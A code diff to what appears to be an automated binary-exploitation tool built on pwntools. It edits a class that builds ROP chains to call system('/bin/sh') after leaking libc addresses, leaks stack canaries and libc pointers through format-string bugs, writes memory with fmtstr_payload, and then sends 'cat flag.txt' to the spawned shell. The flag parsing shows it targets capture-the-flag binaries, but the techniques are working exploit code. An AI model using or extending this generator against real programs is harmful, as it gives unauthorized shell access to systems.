@@ -23,6 +23,7 @@ class Against:
         )
 
         self.binary = binary_path
+        self.binary_name = binary_path.split("/")[-1]
         self.elf = ELF(self.binary)
         self.libc = libc
             
@@ -36,6 +37,8 @@ class Against:
         self.flag = None
         self.remote_flag = None
         self.flag_format = flag_format
+        self.flag_regex = re.compile(re.escape(flag_format) + b"{([^}]*)}")
+
 
         self.libc_offset_string = b""
         self.canary_offset_string = b""
@@ -85,7 +88,7 @@ class Against:
             return chain 
 
         write_gadget, reg1, reg2 = write_gadgets
-        aegis_log.debug(f"Using write gadget {write_gadget} with {reg1}, {reg2} to {hex(writeable_address)}")
+        aegis_log.debug(f"[{self.binary_name}] Using write gadget {write_gadget} with {reg1}, {reg2} to {hex(writeable_address)}")
         write_gadget_address = int(write_gadget.split(b":")[0],16)
 
         reg_params = self.machine.reg_args 
@@ -121,7 +124,6 @@ class Against:
 
                     write_str = string[index:index+rem+1]
                     write_str = write_str + b"\x00" * (8 - len(write_str))
-                    print(write_str)
                     chain += rg_gadget + write_str
                     instructions = reg_gadget_str.split(b":")[1].split(b";")[1:]
                     for inst in instructions:
@@ -229,7 +231,7 @@ class Against:
             chain += p64(plt_function)
             chain += p64(main)
 
-        aegis_log.debug(f"Setting up libc leak with {self.leak_function}")
+        aegis_log.debug(f"[{self.binary_name}] Setting up libc leak with {self.leak_function}")
         self.has_libc_leak = True
 
         return chain 
@@ -243,7 +245,7 @@ class Against:
             try:
                 output = p.recvline(timeout=2)
             except EOFError:
-                aegis_log.error("Could not find libc leak")
+                aegis_log.error(f"[{self.binary_name}] Could not find libc leak")
                 break
             match = pattern.search(output)
             attempts += 1
@@ -251,14 +253,14 @@ class Against:
         if match:
             leak = match.group(0)
             leak = u64(leak.ljust(8, b'\x00'))
-            aegis_log.info(f"Found libc leak {hex(leak)}")
+            aegis_log.info(f"[{self.binary_name}] Found libc leak {hex(leak)}")
             libc_base = leak - self.libc.sym[symb]
-            aegis_log.info(f"Calculated libc base {hex(libc_base)}")
+            aegis_log.info(f"[{self.binary_name}] Calculated libc base {hex(libc_base)}")
 
             self.libc_resolved = True
             return libc_base
         else:
-            aegis_log.warning(f"Failed to get libc leak")
+            aegis_log.warning(f"[{self.binary_name}] Failed to get libc leak")
             return None
 
     def rop_chain_libc(self, libc_base):
@@ -271,7 +273,7 @@ class Against:
         ret = pop_rdi + 1
         binsh = next(self.libc.search(b"/bin/sh\x00")) + libc_base
 
-        log.info(f"Pop Rdi {hex(pop_rdi)}\nSystem {hex(system)}\nBinsh {hex(binsh)}")
+        log.info(f"[{self.binary_name}] Pop Rdi {hex(pop_rdi)}\nSystem {hex(system)}\nBinsh {hex(binsh)}")
 
         chain += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
 
@@ -333,16 +335,17 @@ class Against:
 
                     if canary and self.machine.canary:
                         self.canary_offset_string = offset_str
-                        aegis_log.info(f"Found canary leak at offset {i}: {address}")
+                        aegis_log.info(f"[{self.binary_name}] Found canary leak at offset {i}: {address}")
 
                     libc_leak = re.search(r"0x7f[a-f0-9]+34a", address)
 
                     if libc_leak:
                         self.libc_offset_string = offset_str.split(".")[0]
-                        aegis_log.info(f"Found libc leak at offset {i} with {address}")
+                        aegis_log.info(f"[{self.binary_name}] Found libc leak at offset {i} with {address}")
 
                     hex = [response[i:i+2] for i in range(0, 16, 2)][::-1]
 
+                    #print(hex)
                     try: 
                         new_string = ""
                         for val in hex:
@@ -354,7 +357,7 @@ class Against:
                         # start end [ 0 , 0]
                         # first var is if the first part of the flag was found
 
-                        if self.flag_format in new_string and start_end[0] == 0:
+                        if self.flag_format.decode("utf-8") in new_string and start_end[0] == 0:
                             string += new_string
                             start_end[0] = 1
                         elif start_end[0] == 1 and "}" in new_string:
@@ -393,7 +396,7 @@ class Against:
             addr: value
         }
 
-        aegis_log.debug(f"Setting up format string write to {hex(addr)} with value {hex(value)}")
+        aegis_log.debug(f"[{self.binary_name}] Setting up format string write to {hex(addr)} with value {hex(value)}")
         offset = 0
         
         # Find first offset
@@ -409,16 +412,18 @@ class Against:
                 break
             p.close()
 
-        aegis_log.debug(f"Found stack offset {offset}")
+        aegis_log.debug(f"[{self.binary_name}] Found stack offset {offset}")
         self.format_exploit = fmtstr_payload(offset, payload_writes, write_size='byte')
 
     def check_exploit(self):
         """Checks exploit for bad bytes."""
-        for byte in self.exploit: 
-            if byte == 10:
-                aegis_log.error(f"Found bad byte \n in exploit")
-                return False
-        return True
+        if b"\x0a" in self.exploit:
+            self.exploit = self.exploit.replace(b"\x0a", b"\x0b")
+            aegis_log.error(f"[{self.binary_name}] Found bad byte \\n in exploit")
+        if self.array_exploit != None and b"\x0a" in self.array_exploit[1]:
+            self.array_exploit[1] = self.array_exploit[1].replace(b"\x0a", b"\x0b")
+            aegis_log.error(f"[{self.binary_name}] Found bad byte \\n in exploit")
+
 
     def send_exploit(self):
         self.exploit = self.padding + self.chain
@@ -469,25 +474,25 @@ class Against:
     def recieve_flag(self):
         """Return the flag after parsing it from the binary."""
         try:
-            #output = self.process.recvall(timeout=.5) 
-
             # Just for safe measures ofc
             self.process.sendline(b"cat flag.txt")
             self.process.sendline(b"cat flag.txt")
-            #self.process.sendline(b"cat flag.txt")
-            #self.process.sendline(b"cat flag.txt")
+            self.process.sendline(b"cat flag.txt")
+            self.process.sendline(b"exit")
 
             output = self.process.recvall(timeout=2)
             # Don't want to print big output from format write
             if self.format_exploit == None:
                 aegis_log.debug(f"Recieved output {output}")
-            if b"{" in output and b"}":
-                self.flag = b"{" + output.split(b"{")[1].replace(b" ", b"")
-                self.flag = self.flag.replace(b"\n", b"").split(b"}")[0] + b"}"
-                self.flag = self.flag.decode()
-                self.flag = self.flag_format + self.flag 
+            match = self.flag_regex.search(output)
+
+            if match:
+                self.flag = self.flag_format.decode("utf-8") + "{" + match.group(1).decode('utf-8') + "}" 
                 aegis_log.info(f"Captured the flag !!! {self.flag}")
                 return 1
-        except EOFError:
-            aegis_log.error(f"Error recieving flag")
+            elif b"command not found" in output:
+                aegis_log.error(f"Error from shell command")
+                return 1
+        except EOFError as e:
+            aegis_log.error(f"Error recieving flag {e}")
             return -1
